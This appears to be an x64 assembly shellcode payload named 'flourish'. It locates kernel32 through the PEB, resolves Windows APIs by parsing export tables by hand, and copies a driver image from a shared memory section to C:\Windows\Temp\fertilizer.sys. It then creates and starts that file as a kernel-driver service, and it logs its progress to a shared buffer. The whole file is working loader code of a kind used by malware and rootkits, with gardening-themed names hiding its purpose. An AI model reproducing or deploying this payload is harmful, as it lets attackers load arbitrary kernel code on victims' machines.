.code
ALIGN 16

Report MACRO level, msg
    mov rcx, level
    lea rdx, [msg]
    mov r8, [rbp-160]
    mov r9, [rbp-176]
    mov rax, [rbp-48]
    mov [rsp+20h], rax
    mov rax, [rbp-56]
    mov [rsp+28h], rax
    call ReportMessage
ENDM

flourish PROC
    jmp entry

szGetProcAddress      db "GetProcAddress", 0
szAdvapi32            db "advapi32.dll", 0

szOpenMutexW           db "OpenMutexW", 0
szOpenFileMappingW     db "OpenFileMappingW", 0
szMapViewOfFile        db "MapViewOfFile", 0
szWaitForSingleObject  db "WaitForSingleObject", 0
szReleaseMutex         db "ReleaseMutex", 0
szCreateFileW          db "CreateFileW", 0
szWriteFile            db "WriteFile", 0
szCloseHandle          db "CloseHandle", 0
szVirtualQuery         db "VirtualQuery", 0
szLoadLibraryA         db "LoadLibraryA", 0
szGetLastError         db "GetLastError", 0
szOpenSCManagerW       db "OpenSCManagerW", 0
szCreateServiceW       db "CreateServiceW", 0
szOpenServiceW         db "OpenServiceW", 0
szStartServiceW        db "StartServiceW", 0
szCloseServiceHandle   db "CloseServiceHandle", 0

ALIGN 8
wszMutex dw 'L','o','c','a','l','\','D','4','1','S','Y','.','R','e','p','o','r','t','.','M','u','t','e','x', 0
wszMapping dw 'L','o','c','a','l','\','D','4','1','S','Y','.','R','e','p','o','r','t', 0
wszFertilizerMapping dw 'L','o','c','a','l','\','D','4','1','S','Y','.','F','e','r','t','i','l','i','z','e','r', 0
wszDriverPath dw 'C',':','\','W','i','n','d','o','w','s','\','T','e','m','p','\','f','e','r','t','i','l','i','z','e','r','.','s','y','s', 0
wszServiceName dw 'D','4','1','S','Y','F','e','r','t','i','l','i','z','e','r', 0
wszMsgStart dw '[', 273Fh, ']',' ','s','t','a','r','t','e','d',' ','t','o',' ','t','h','r','i','v','e', 0
wszMsgFertilizerOpened dw '[', 273Fh, ']',' ','f','e','r','t','i','l','i','z','e','r',' ','o','p','e','n','e','d', 0
wszMsgDriverDropped dw '[', 273Fh, ']',' ','d','r','i','v','e','r',' ','d','r','o','p','p','e','d', 0
wszMsgServiceCreated dw '[', 273Fh, ']',' ','s','e','r','v','i','c','e',' ','c','r','e','a','t','e','d', 0
wszMsgServiceStarted dw '[', 273Fh, ']',' ','s','e','r','v','i','c','e',' ','s','t','a','r','t','e','d', 0
wszMsgError dw '[', 273Fh, ']',' ','e','r','r','o','r',' ','o','c','c','u','r','r','e','d', 0
wszMsgEnd dw '[', 273Fh, ']',' ','w','i','l','t','i','n','g','.','.','.','.', 0

wszErrFertilizer dw '[', 273Fh, ']',' ','e','r','r','o','r',' ','f','e','r','t','i','l','i','z','e','r', 0
wszErrMapFertilizer dw '[', 273Fh, ']',' ','e','r','r','o','r',' ','m','a','p',' ','f','e','r','t','i','l','i','z','e','r', 0
wszErrVirtualQuery dw '[', 273Fh, ']',' ','e','r','r','o','r',' ','v','i','r','t','u','a','l','q','u','e','r','y', 0
wszErrCreateFile dw '[', 273Fh, ']',' ','e','r','r','o','r',' ','c','r','e','a','t','e','f','i','l','e', 0
wszErrWriteFile dw '[', 273Fh, ']',' ','e','r','r','o','r',' ','w','r','i','t','e','f','i','l','e', 0
wszErrOpenSCM dw '[', 273Fh, ']',' ','e','r','r','o','r',' ','o','p','e','n','s','c','m', 0
wszErrCreateService dw '[', 273Fh, ']',' ','e','r','r','o','r',' ','c','r','e','a','t','e','s','e','r','v','i','c','e', 0
wszErrOpenService dw '[', 273Fh, ']',' ','e','r','r','o','r',' ','o','p','e','n','s','e','r','v','i','c','e', 0
wszErrStartService dw '[', 273Fh, ']',' ','e','r','r','o','r',' ','s','t','a','r','t','s','e','r','v','i','c','e', 0

ALIGN 16
entry:
    push rbp
    mov rbp, rsp
    and rsp, -16
    
    sub rsp, 300h
    mov [rsp+200h], rsi
    mov [rsp+208h], rdi
    mov [rsp+210h], rbx
    mov [rsp+218h], r12
    mov [rsp+220h], r13
    mov [rsp+228h], r14
    mov [rsp+230h], r15

    ; 1. Get Kernel32 Base
    mov rax, gs:[60h]
    mov rax, [rax + 18h]
    mov rax, [rax + 20h]
    mov rax, [rax]
    mov rax, [rax]
    mov rbx, [rax + 20h]
    mov [rbp-8], rbx

    ; 2. Find GetProcAddress
    mov rcx, rbx
    lea rdx, [szGetProcAddress]
    call GetExportAddress
    mov [rbp-16], rax

    ; OpenMutexW
    mov rcx, [rbp-8]
    lea rdx, [szOpenMutexW]
    mov rax, [rbp-16]
    call rax
    mov [rbp-24], rax
    ; OpenFileMappingW
    mov rcx, [rbp-8]
    lea rdx, [szOpenFileMappingW]
    mov rax, [rbp-16]
    call rax
    mov [rbp-32], rax
    ; MapViewOfFile
    mov rcx, [rbp-8]
    lea rdx, [szMapViewOfFile]
    mov rax, [rbp-16]
    call rax
    mov [rbp-40], rax
    ; WaitForSingleObject
    mov rcx, [rbp-8]
    lea rdx, [szWaitForSingleObject]
    mov rax, [rbp-16]
    call rax
    mov [rbp-48], rax
    ; ReleaseMutex
    mov rcx, [rbp-8]
    lea rdx, [szReleaseMutex]
    mov rax, [rbp-16]
    call rax
    mov [rbp-56], rax
    ; CreateFileW
    mov rcx, [rbp-8]
    lea rdx, [szCreateFileW]
    mov rax, [rbp-16]
    call rax
    mov [rbp-64], rax
    ; WriteFile
    mov rcx, [rbp-8]
    lea rdx, [szWriteFile]
    mov rax, [rbp-16]
    call rax
    mov [rbp-72], rax
    ; CloseHandle
    mov rcx, [rbp-8]
    lea rdx, [szCloseHandle]
    mov rax, [rbp-16]
    call rax
    mov [rbp-80], rax
    ; VirtualQuery
    mov rcx, [rbp-8]
    lea rdx, [szVirtualQuery]
    mov rax, [rbp-16]
    call rax
    mov [rbp-88], rax
    ; LoadLibraryA
    mov rcx, [rbp-8]
    lea rdx, [szLoadLibraryA]
    mov rax, [rbp-16]
    call rax
    mov [rbp-96], rax
    ; GetLastError
    mov rcx, [rbp-8]
    lea rdx, [szGetLastError]
    mov rax, [rbp-16]
    call rax
    mov [rbp-104], rax

    ; Load advapi32.dll
    lea rcx, [szAdvapi32]
    mov rax, [rbp-96] ; LoadLibraryA
    call rax
    mov [rbp-112], rax
    ; OpenSCManagerW
    mov rcx, [rbp-112]
    lea rdx, [szOpenSCManagerW]
    mov rax, [rbp-16]
    call rax
    mov [rbp-120], rax
    ; CreateServiceW
    mov rcx, [rbp-112]
    lea rdx, [szCreateServiceW]
    mov rax, [rbp-16]
    call rax
    mov [rbp-128], rax
    ; OpenServiceW
    mov rcx, [rbp-112]
    lea rdx, [szOpenServiceW]
    mov rax, [rbp-16]
    call rax
    mov [rbp-136], rax
    ; StartServiceW
    mov rcx, [rbp-112]
    lea rdx, [szStartServiceW]
    mov rax, [rbp-16]
    call rax
    mov [rbp-144], rax
    ; CloseServiceHandle
    mov rcx, [rbp-112]
    lea rdx, [szCloseServiceHandle]
    mov rax, [rbp-16]
    call rax
    mov [rbp-152], rax

    ; Open Mutex
    mov rcx, 00100001h      ; SYNCHRONIZE | MUTEX_MODIFY_STATE
    xor rdx, rdx
    lea r8, [wszMutex]
    mov rax, [rbp-24]       ; OpenMutexW
    call rax
    mov [rbp-160], rax
    test rax, rax
    jz Cleanup

    ; Open File Mapping (Report)
    mov rcx, 2              ; FILE_MAP_WRITE
    xor rdx, rdx
    lea r8, [wszMapping]
    mov rax, [rbp-32]       ; OpenFileMappingW
    call rax
    mov [rbp-168], rax
    test rax, rax
    jz Cleanup

    ; Map View Of File (Report)
    mov rcx, [rbp-168]
    mov rdx, 2              ; FILE_MAP_WRITE
    xor r8, r8
    xor r9, r9
    mov qword ptr [rsp + 20h], 0
    mov rax, [rbp-40]       ; MapViewOfFile
    call rax
    mov [rbp-176], rax
    test rax, rax
    jz Cleanup

    ; Write Start Message
    Report 1, wszMsgStart

    ; Open Fertilizer Mapping
    mov rcx, 4              ; FILE_MAP_READ
    xor rdx, rdx
    lea r8, [wszFertilizerMapping]
    mov rax, [rbp-32]       ; OpenFileMappingW
    call rax
    mov [rbp-184], rax
    test rax, rax
    jz ErrorOut_FertilizerMap

    ; Map View Of File (Fertilizer)
    mov rcx, [rbp-184]
    mov rdx, 4              ; FILE_MAP_READ
    xor r8, r8
    xor r9, r9
    mov qword ptr [rsp + 20h], 0
    mov rax, [rbp-40]       ; MapViewOfFile
    call rax
    mov [rbp-192], rax
    test rax, rax
    jz ErrorOut_FertilizerView

    ; Write Fertilizer Opened Message
    Report 0, wszMsgFertilizerOpened

    ; VirtualQuery to get size
    mov rcx, [rbp-192]      ; pFertilizerBuffer
    lea rdx, [rbp-250h]     ; MEMORY_BASIC_INFORMATION (size 48)
    mov r8, 48              ; sizeof(MEMORY_BASIC_INFORMATION)
    mov rax, [rbp-88]       ; VirtualQuery
    call rax
    test rax, rax
    jz ErrorOut_VirtualQuery

    mov r12, [rbp-250h + 18h] ; mbi.RegionSize (offset 24)

    ; CreateFileW
    lea rcx, [wszDriverPath]
    mov rdx, 40000000h      ; GENERIC_WRITE
    xor r8, r8              ; 0 (no sharing)
    xor r9, r9              ; NULL
    mov qword ptr [rsp + 20h], 2 ; CREATE_ALWAYS
    mov qword ptr [rsp + 28h], 80h ; FILE_ATTRIBUTE_NORMAL
    mov qword ptr [rsp + 30h], 0 ; NULL
    mov rax, [rbp-64]       ; CreateFileW
    call rax
    mov [rbp-200], rax      ; hFile
    cmp rax, -1             ; INVALID_HANDLE_VALUE
    je ErrorOut_CreateFile

    ; WriteFile
    mov rcx, [rbp-200]      ; hFile
    mov rdx, [rbp-192]      ; pFertilizerBuffer
    mov r8, r12             ; size
    lea r9, [rbp-260h]      ; &bytesWritten
    mov qword ptr [rsp + 20h], 0 ; NULL
    mov rax, [rbp-72]       ; WriteFile
    call rax
    test rax, rax
    jz ErrorOut_WriteFile

    ; CloseHandle (hFile)
    mov rcx, [rbp-200]
    mov rax, [rbp-80]       ; CloseHandle
    call rax

    ; Write Driver Dropped Message
    Report 0, wszMsgDriverDropped

    ; OpenSCManagerW
    xor rcx, rcx
    xor rdx, rdx
    mov r8, 2               ; SC_MANAGER_CREATE_SERVICE
    mov rax, [rbp-120]      ; OpenSCManagerW
    call rax
    mov [rbp-208], rax      ; hSCM
    test rax, rax
    jz ErrorOut_OpenSCM

    ; CreateServiceW
    mov rcx, [rbp-208]      ; hSCM
    lea rdx, [wszServiceName]
    lea r8, [wszServiceName]
    mov r9, 30030h          ; SERVICE_START | DELETE | SERVICE_STOP
    mov qword ptr [rsp + 20h], 1 ; SERVICE_KERNEL_DRIVER
    mov qword ptr [rsp + 28h], 3 ; SERVICE_DEMAND_START
    mov qword ptr [rsp + 30h], 0 ; SERVICE_ERROR_IGNORE
    lea rax, [wszDriverPath]
    mov qword ptr [rsp + 38h], rax
    mov qword ptr [rsp + 40h], 0
    mov qword ptr [rsp + 48h], 0
    mov qword ptr [rsp + 50h], 0
    mov qword ptr [rsp + 58h], 0
    mov qword ptr [rsp + 60h], 0
    mov rax, [rbp-128]      ; CreateServiceW
    call rax
    mov [rbp-216], rax      ; hService
    test rax, rax
    jnz ServiceCreated

    ; Check GetLastError == ERROR_SERVICE_EXISTS (1073)
    mov rax, [rbp-104]      ; GetLastError
    call rax
    cmp rax, 1073
    jne ErrorOut_CreateService

    ; OpenServiceW
    mov rcx, [rbp-208]
    lea rdx, [wszServiceName]
    mov r8, 30030h          ; SERVICE_START | DELETE | SERVICE_STOP
    mov rax, [rbp-136]      ; OpenServiceW
    call rax
    mov [rbp-216], rax
    test rax, rax
    jz ErrorOut_OpenService

ServiceCreated:
    ; Write Service Created Message
    Report 0, wszMsgServiceCreated

    ; StartServiceW
    mov rcx, [rbp-216]      ; hService
    xor rdx, rdx
    xor r8, r8
    mov rax, [rbp-144]      ; StartServiceW
    call rax
    test rax, rax
    jnz ServiceStarted

    ; Check GetLastError == ERROR_SERVICE_ALREADY_RUNNING (1056)
    mov rax, [rbp-104]      ; GetLastError
    call rax
    cmp rax, 1056
    jne ErrorOut_StartService

ServiceStarted:
    ; Write Service Started Message
    Report 1, wszMsgServiceStarted

    ; CloseServiceHandle (hService)
    mov rcx, [rbp-216]
    mov rax, [rbp-152]
    call rax

    ; CloseServiceHandle (hSCM)
    mov rcx, [rbp-208]
    mov rax, [rbp-152]
    call rax
    
    jmp SuccessOut

ErrorOut_FertilizerMap:
    Report 2, wszErrFertilizer
    jmp Cleanup

ErrorOut_FertilizerView:
    Report 2, wszErrMapFertilizer
    jmp Cleanup

ErrorOut_VirtualQuery:
    Report 2, wszErrVirtualQuery
    jmp Cleanup

ErrorOut_CreateFile:
    Report 2, wszErrCreateFile
    jmp Cleanup

ErrorOut_WriteFile:
    Report 2, wszErrWriteFile
    jmp Cleanup

ErrorOut_OpenSCM:
    Report 2, wszErrOpenSCM
    jmp Cleanup

ErrorOut_CreateService:
    Report 2, wszErrCreateService
    jmp Cleanup

ErrorOut_OpenService:
    Report 2, wszErrOpenService
    jmp Cleanup

ErrorOut_StartService:
    Report 2, wszErrStartService
    jmp Cleanup

ErrorOut:
    ; GetLastError
    mov rax, [rbp-104]
    call rax
    
    ; We'll just report a generic error for now, but we could format the error code
    Report 2, wszMsgError

SuccessOut:
    ; Write End Message
    Report 0, wszMsgEnd

Cleanup:
    mov rsi, [rsp+200h]
    mov rdi, [rsp+208h]
    mov rbx, [rsp+210h]
    mov r12, [rsp+218h]
    mov r13, [rsp+220h]
    mov r14, [rsp+228h]
    mov r15, [rsp+230h]
    mov rsp, rbp
    pop rbp
    ret

flourish ENDP

; RCX = hModule, RDX = lpProcName
GetExportAddress:
    push rdi
    push rsi
    push rbx

    mov r8, rcx
    mov eax, [r8 + 3Ch]
    mov r9, r8
    add r9, rax
    
    mov eax, [r9 + 88h]
    mov r9, r8
    add r9, rax
    
    mov r10d, [r9 + 18h]
    mov eax, [r9 + 20h]
    mov r11, r8
    add r11, rax

    xor rax, rax

find_name_loop:
    cmp eax, r10d
    jge not_found

    mov edi, [r11 + rax * 4]
    add rdi, r8
    mov rsi, rdx

compare_loop:
    mov cl, byte ptr [rdi]
    mov bl, byte ptr [rsi]
    cmp cl, bl
    jne name_mismatch
    test cl, cl
    jz name_found
    inc rdi
    inc rsi
    jmp compare_loop

name_mismatch:
    inc rax
    jmp find_name_loop

name_found:
    mov ecx, [r9 + 24h]
    add rcx, r8
    movzx ecx, word ptr [rcx + rax * 2]

    mov edx, [r9 + 1Ch]
    add rdx, r8
    mov eax, [rdx + rcx * 4]
    add rax, r8
    jmp done

not_found:
    xor rax, rax

done:
    pop rbx
    pop rsi
    pop rdi
    ret

; RCX = Level, RDX = Message, R8 = hMutex, R9 = pBuffer
; [rsp+28h] = pWaitForSingleObject, [rsp+30h] = pReleaseMutex
ReportMessage PROC
    push rbp
    mov rbp, rsp
    push rsi
    push rdi
    push rbx
    sub rsp, 28h

    mov [rbp+10h], rcx      ; Level
    mov [rbp+18h], rdx      ; Message
    mov [rbp+20h], r8       ; hMutex
    mov [rbp+28h], r9       ; pBuffer

    ; WaitForSingleObject(hMutex, INFINITE)
    mov rcx, r8
    mov rdx, 0FFFFFFFFh     ; INFINITE
    mov rax, [rbp+30h]      ; pWaitForSingleObject
    call rax

    ; Write to Buffer
    mov rbx, [rbp+28h]      ; pBuffer
    mov eax, [rbx]          ; WriteCount
    and eax, 0FFh           ; WriteCount % 256

    imul eax, eax, 260      ; sizeof(REPORT_ENTRY)
    add eax, 4              ; offset to Entries array
    add rbx, rax            ; rbx = &entry

    mov eax, dword ptr [rbp+10h] ; Level
    mov dword ptr [rbx], eax     ; entry->Level = Level

    ; Copy Message to entry->Text
    mov rsi, [rbp+18h]      ; Message
    lea rdi, [rbx + 4]      ; entry->Text
msg_copy_loop:
    mov ax, [rsi]
    mov [rdi], ax
    add rsi, 2
    add rdi, 2
    test ax, ax
    jnz msg_copy_loop

    ; InterlockedIncrement(&pBuffer->WriteCount)
    mov rbx, [rbp+28h]
    lock inc dword ptr [rbx]

    ; ReleaseMutex(hMutex)
    mov rcx, [rbp+20h]
    mov rax, [rbp+38h]      ; pReleaseMutex
    call rax

    add rsp, 28h
    pop rbx
    pop rdi
    pop rsi
    pop rbp
    ret
ReportMessage ENDP

END